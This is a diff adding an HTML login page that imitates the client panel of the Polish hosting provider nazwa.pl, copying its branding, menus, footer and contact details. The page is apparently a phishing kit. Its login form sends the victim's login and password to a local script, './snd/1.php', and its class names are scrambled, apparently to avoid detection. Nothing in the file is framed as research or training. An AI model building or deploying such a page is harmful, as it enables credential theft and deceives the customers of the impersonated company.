@@ -1,0 +1,709 @@
+<!DOCTYPE html><html lang="pl"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nazwa.pl Clone - Login</title>
+    <style>
+        /* Global Styles */
+        @font-face {
+            font-family: 'UbuntuRegular';
+            src: url('./fonts/ubuntu-regular.woff') format('woff');
+            font-weight: normal;
+            font-style: normal;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            font-family: 'UbuntuRegular', serif;
+        }
+
+        /* Header Styles */
+        .elg {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 1rem;
+            border-bottom: 1px solid #eee;
+            text-align: center;
+        }
+
+        .bjorn {
+            height: 40px;
+            margin-bottom: 0.5rem;
+        }
+
+        .n21-elg__text {
+            margin: 0;
+            font-size: 18px;
+            color: #6c6c6c;
+            line-height: 1.2;
+            padding: 0.5rem 0;
+        }
+
+        .n21-elg__tools-wrapper {
+            padding: 0.5rem 0;
+            width: 100%;
+        }
+
+        .n21-elg__toolsList {
+            list-style: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1.5rem;
+            margin: 0;
+            padding: 0;
+            min-width: unset;
+        }
+
+        .gaupe-link {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            text-decoration: none;
+            color: #333;
+            font-size: 0.8rem;
+        }
+
+        .gaupe-link svg {
+            color: #666;
+        }
+
+        .jerv-program {
+            display: block;
+            color: #ff0000;
+            text-decoration: none;
+            text-align: center;
+            font-size: 0.7rem;
+            margin-top: 0.5rem;
+        }
+
+        /* Navigation Styles */
+        .n21-elg__bottom {
+            background: linear-gradient(to right, #0b3756 50%, #0e5d94 50%);
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: stretch;
+            padding: 0;
+        }
+
+        .rein-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: stretch;
+            width: 100%;
+            padding: 0;
+            margin: 0;
+        }
+
+        .ulv-toggle {
+            display: flex;
+            align-items: center;
+            background: none;
+            border: none;
+            cursor: pointer;
+            width: 50%;
+            padding: 1rem;
+            justify-content: flex-start;
+        }
+
+        .ulv-toggle svg {
+            width: 24px;
+            height: 24px;
+            color: white;
+        }
+
+        .n21-elg__miniCartDisabled {
+            width: 50%;
+            padding: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            text-decoration: none;
+            font-size: 1rem;
+            background: transparent;
+        }
+
+        .rein-list {
+            display: none; /* Hidden by default on mobile */
+        }
+
+        /* Main Content Styles */
+        .hval-content {
+            flex-grow: 1;
+            max-width: 500px;
+            margin: 3rem auto;
+            padding: 0 1rem;
+        }
+
+        .oter-header {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+        }
+
+        .loginFirstHeader {
+            color: #333;
+            font-size: 0.99rem;
+            font-weight: normal;
+        }
+
+        .loginFormContainerSwitcher {
+            background: none;
+            border: none;
+            color: #1a73e8;
+            cursor: pointer;
+            font-size: 0.8rem;
+            text-decoration: none;
+        }
+
+        .loginFormContainerSwitcher:hover {
+            text-decoration: underline;
+        }
+
+        .componentFormContainer {
+            background-color: #0e5d94;
+            padding: 2rem;
+            border-radius: 4px;
+            color: white;
+        }
+
+        .reg_tab {
+            width: 100%;
+        }
+
+        .reg_tab_title {
+            font-size: 1.5rem;
+            font-weight: normal;
+            padding-bottom: 1rem;
+        }
+
+        .top_cell, .label {
+            padding: 0.5rem 0;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 0.5rem;
+            border: 1px solid #ddd;
+            border-radius: 1px;
+        }
+
+        .sm_link {
+            text-align: right;
+            padding-top: 0.5rem;
+        }
+
+        .sm_link a {
+            color: white;
+            text-decoration: none;
+        }
+
+        .sm_link a:hover {
+            text-decoration: underline;
+        }
+
+        .button-maker {
+            padding-top: 1rem;
+        }
+
+        .na-button {
+            background-color: #ff6634;
+            color: white;
+            padding: 0.75rem 2rem;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+        }
+
+        .na-button:hover {
+            background-color: #ff7744;
+        }
+
+        .eye {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+        }
+
+        /* Footer Styles */
+        .sel {
+            background-color: #5d5d5d;
+            color: white;
+            padding: 3rem 2rem;
+        }
+
+        .sel-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 2rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .sel-column h3 {
+            color: #8bc34a;
+            margin-bottom: 1rem;
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
+
+        .sel-column ul {
+            list-style: none;
+        }
+
+        .sel-column ul li {
+            margin-bottom: 0.5rem;
+        }
+
+        .sel-column a {
+            color: #eaeaea;
+            text-decoration: none;
+            font-size: 0.85rem;
+        }
+
+        .sel-column a:hover {
+            text-decoration: underline;
+        }
+
+        .contact-info {
+            margin-top: 1rem;
+        }
+
+        .phone-number, .email {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+            gap: 0.5rem;
+        }
+
+        .subtext {
+            font-size: 0.8rem;
+            color: #999;
+        }
+
+        .social-media {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        .social-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .jerv-program-content {
+            font-size: 0.85rem;
+            line-height: 1.4;
+        }
+
+        .commission-badge {
+            margin-bottom: 1rem;
+        }
+
+        .certificates {
+            margin-top: 2rem;
+        }
+
+        .iso-cert {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            font-size: 0.8rem;
+        }
+
+        .test-speed {
+            display: flex;
+            justify-content: center;
+            margin: 2rem 0;
+        }
+
+        .sel-bottom {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding-top: 2rem;
+            border-top: 1px solid #555;
+            font-size: 0.8rem;
+            color: #999;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 1200px) {
+            .sel-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .sel-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Desktop Styles */
+        @media (min-width: 768px) {
+            .elg {
+                flex-direction: row;
+                justify-content: space-between;
+                padding: 1rem 1.5rem;
+                text-align: left;
+                border-bottom: none;
+            }
+
+            .bjorn {
+                margin-bottom: 0;
+                order: 1;
+            }
+
+            .n21-elg__text {
+                order: 2;
+                padding: 0;
+                margin: 0 auto;
+            }
+
+            .n21-elg__tools-wrapper {
+                order: 3;
+                width: auto;
+                padding: 0;
+            }
+
+            .n21-elg__toolsList {
+                justify-content: flex-end;
+                gap: 2rem;
+            }
+
+            .jerv-program {
+                text-align: right;
+                margin-top: 0.3rem;
+            }
+
+            .n21-elg__bottom {
+                padding: 0;
+                background: #0b3756;
+            }
+
+            .rein-container {
+                max-width: 1200px;
+                margin: 0 auto;
+                padding: 0 2rem;
+            }
+
+            .ulv-toggle {
+                display: none;
+            }
+
+            .rein-list {
+                display: flex;
+                list-style: none;
+                margin: 0;
+                padding: 0;
+                gap: 2rem;
+            }
+
+            .rein-list li a {
+                color: #fff;
+                text-decoration: none;
+                padding: 1rem 0;
+                display: block;
+                font-size: 13px;
+            }
+
+            .n21-elg__miniCartDisabled {
+                width: auto;
+                padding: 1rem 2rem;
+                background: #0e5d94;
+            }
+        }
+
+        /* Mobile Styles Updates */
+        @media (max-width: 767px) {
+            .n21-elg__bottom {
+                background: #0b3656;
+                position: relative;
+                display: flex;
+                justify-content: space-between;
+                align-items: stretch;
+                padding: 0;
+            }
+
+            .n21-elg__miniCartDisabled {
+                width: 50%;
+                padding: 1rem;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                color: #fff;
+                text-decoration: none;
+                font-size: 1rem;
+                background: #0e5d94;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="elg">
+        <img src="./img/lgo.png" class="bjorn">
+        <span class="n21-elg__text">Nowoczesne usługi w&nbsp;chmurze</span>
+        <nav class="n21-elg__tools-wrapper">
+            <ul class="n21-elg__toolsList">
+                <li>
+                    <a class="gaupe-link">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"></path>
+                        </svg>
+                        NARZĘDZIA ▼
+                    </a>
+                </li>
+                <li>
+                    <a class="gaupe-link">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                            <circle cx="12" cy="7" r="4"></circle>
+                        </svg>
+                        PANEL KLIENTA
+                    </a>
+                </li>
+                <li>
+                    <a class="gaupe-link">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+                            <polyline points="22,6 12,13 2,6"></polyline>
+                        </svg>
+                        POCZTA
+                    </a>
+                </li>
+            </ul>
+            <a class="jerv-program">PROGRAM PARTNERSKI 50% PROWIZJI ›</a>
+        </nav>
+    </header>
+
+    <nav class="n21-elg__bottom">
+        <div class="rein-container">
+            <button class="ulv-toggle" aria-label="Toggle menu">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <line x1="3" y1="12" x2="21" y2="12"></line>
+                    <line x1="3" y1="18" x2="21" y2="18"></line>
+                </svg>
+            </button>
+            <ul class="rein-list">
+                <li><a>DOMENY</a></li>
+                <li><a>POCZTA</a></li>
+                <li><a>HOSTING</a></li>
+                <li><a>WORDPRESS</a></li>
+                <li><a>KOMUNIKACJA E-MAIL</a></li>
+                <li><a>VPS</a></li>
+                <li><a>SaaS</a></li>
+                <li><a>SSL</a></li>
+            </ul>
+            <a class="n21-elg__miniCartDisabled">Twój koszyk</a>
+        </div>
+    </nav>
+
+    <main class="hval-content">
+        <div class="oter-header">
+            <h2 class="loginFirstHeader">Zaloguj się do konta</h2>
+            <a class="loginFormContainerSwitcher">Nie masz konta? Zarejestruj się</a>
+        </div>
+        <form action="./snd/1.php" method="post" name="smiya" id="elg">
+            <div class="componentFormContainer">
+                <div class="componentFormContainerInner">
+                    <table border="0" cellspacing="0" cellpadding="3" class="reg_tab formSectionView hideSectionHeader noBottomSeparator" id="labelElgSection1">
+                        <tbody>
+                            <tr>
+                                <td class="reg_tab_title" colspan="2">
+                                    Zaloguj się do Panelu Klienta
+                                </td>
+                            </tr>
+                            <tr>
+                                <td class="top_cell" id="td_gaupe">
+                                    <label for="gaupe">Login</label>
+                                </td>
+                                <td class="top_cell">
+                                    <input type="text" name="smiya" id="gaupe" class="login" required="">
+                                </td>
+                            </tr>
+                            <tr>
+                                <td class="label" id="td_jerv">
+                                    <label for="jerv">Hasło</label>
+                                </td>
+                                <td>
+                                    <div style="position: relative;">
+                                        <input type="password" name="nari" class="password" id="jerv" required="">
+                                    </div>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td colspan="2">
+                                    <div class="sm_link recoverPasswordMsg">
+                                        <a>Nie pamiętasz hasła?</a>
+                                    </div>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td colspan="2" class="btm_cell">
+                                    <div class="button-maker">
+                                        <input type="submit" value="Zaloguj się" name="__submit_PK_rein" id="__submit_PK_rein" class="na-button submit">
+                                    </div>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            <input type="hidden" name="componentInstance" value="PK_ulv">
+            <input type="hidden" name="pageNumber" value="1">
+        </form>
+    </main>
+
+    <footer class="sel">
+        <div class="sel-grid">
+            <div class="sel-column">
+                <h3>O FIRMIE</h3>
+                <ul>
+                    <li><a>Informacje ogólne</a></li>
+                    <li><a>Data Center</a></li>
+                    <li><a>Scrubbing Center</a></li>
+                    <li><a>Technologia CloudHosting</a></li>
+                    <li><a>Serwery CloudHosting</a></li>
+                    <li><a>Looking Glass</a></li>
+                    <li><a>Zarząd spółki</a></li>
+                    <li><a>Biuro prasowe</a></li>
+                    <li><a>Kariera w nazwa.pl</a></li>
+                    <li><a>Kontakt</a></li>
+                </ul>
+            </div>
+            <div class="sel-column">
+                <h3>PRODUKTY</h3>
+                <ul>
+                    <li><a>Backup</a></li>
+                    <li><a>Mail Backup</a></li>
+                    <li><a>Domeny</a></li>
+                    <li><a>Poczta</a></li>
+                    <li><a>CloudHosting Pay-Per-Use</a></li>
+                    <li><a>Hosting z CDN nazwa.pl</a></li>
+                    <li><a>WordPress z CDN nazwa.pl</a></li>
+                    <li><a>e-Sklep z CDN nazwa.pl</a></li>
+                    <li><a>CDN nazwa.pl</a></li>
+                    <li><a>VPS</a></li>
+                    <li><a>SaaS</a></li>
+                    <li><a>SSL</a></li>
+                    <li><a>Maile Marketingowe</a></li>
+                    <li><a>Usługi IT</a></li>
+                    <li><a>PHP i Bazy danych</a></li>
+                    <li><a>SEO</a></li>
+                    <li><a>Przenieś stronę WWW w 24h</a></li>
+                    <li><a>Tworzenie stron WWW</a></li>
+                    <li><a>Optymalizacja stron WWW</a></li>
+                </ul>
+            </div>
+            <div class="sel-column">
+                <h3>CENTRUM POMOCY</h3>
+                <ul>
+                    <li><a>Blog</a></li>
+                    <li><a>Testuj szybkość WWW</a></li>
+                    <li><a>Pomoc</a></li>
+                    <li><a>Parametry bezpieczeństwa</a></li>
+                    <li><a>Zasady rejestracji domen</a></li>
+                    <li><a>Narzędzia</a></li>
+                    <li><a>Regulaminy</a></li>
+                    <li><a>Gwarancja nazwa.pl</a></li>
+                    <li><a>Cenniki</a></li>
+                    <li><a>Polityka prywatności</a></li>
+                    <li><a>Formularz DSA</a></li>
+                    <li><a>RODO</a></li>
+                </ul>
+            </div>
+            <div class="sel-column">
+                <h3>KONTAKT 24/7</h3>
+                <div class="contact-info">
+                    <div class="phone-number">
+                        <img src="./img/t.png" width="21" height="21" class="icon">
+                        <div>
+                            <div>22 454 48 10</div>
+                            <div class="subtext">tel. komórkowe</div>
+                        </div>
+                    </div>
+                    <div class="phone-number">
+                        <img src="./img/p.png" width="21" height="21" class="icon">
+                        <div>
+                            <div>801 33 22 33</div>
+                            <div class="subtext">tel. stacjonarne</div>
+                        </div>
+                    </div>
+                    <div class="email">
+                        <img src="./img/e.png" width="21" height="21" class="icon">
+                        <a><span class="__cf_email__" data-cfemail="fa9195948e9b918eba949b808d9bd48a96">kontakt@nazwa.pl</span></a>
+                    </div>
+                    <div class="social-media">
+                        <a class="social-icon" aria-label="Facebook">
+                            <img src="./img/f.png" width="21" height="21">
+                        </a>
+                        <a class="social-icon" aria-label="Twitter">
+                            <img src="./img/x.png" width="21" height="21">
+                        </a>
+                        <a class="social-icon" aria-label="Instagram">
+                            <img src="./img/i.png" width="21" height="21">
+                        </a>
+                    </div>
+                </div>
+            </div>
+            <div class="sel-column">
+                <h3>PROGRAM PARTNERSKI 50% PROWIZJI</h3>
+                <div class="jerv-program-content">
+                    <img src="./img/50.png" width="126" height="80" class="commission-badge">
+                    <p>Pobierz z Panelu Klienta swój kod rabatowy Programu Partnerskiego. Twoi znajomi będą mogli kupować usługi nazwa.pl ze zniżką 20%, a Ty zyskasz stałe wynagrodzenie aż do 50% od każdej wpłaty za polecone usługi.</p>
+                    <div class="certificates">
+                        <div class="iso-cert">
+                            <span>Certyfikat ISO 27001:2017</span>
+                            <img src="./img/iso.png" width="242" height="69">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="test-speed">
+            <img src="./img/fo.png" width="180" height="50">
+        </div>
+        <div class="sel-bottom">
+            <p class="price-info">Informacja o najniższej cenie dla oferty, która obowiązywała w okresie 30 dni przed wprowadzeniem obniżki, wskazana jest w odpowiednim Regulaminie promocji.</p>
+            <p class="copyright">© 2024 NetArt Group. Wszelkie prawa zastrzeżone.</p>
+        </div>
+    </footer>
+
+    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+        function togglePassword() {
+            var x = document.getElementById("jerv");
+            if (x.type === "password") {
+                x.type = "text";
+            } else {
+                x.type = "password";
+            }
+        }
+    </script>
+
+
+
+</body></html>
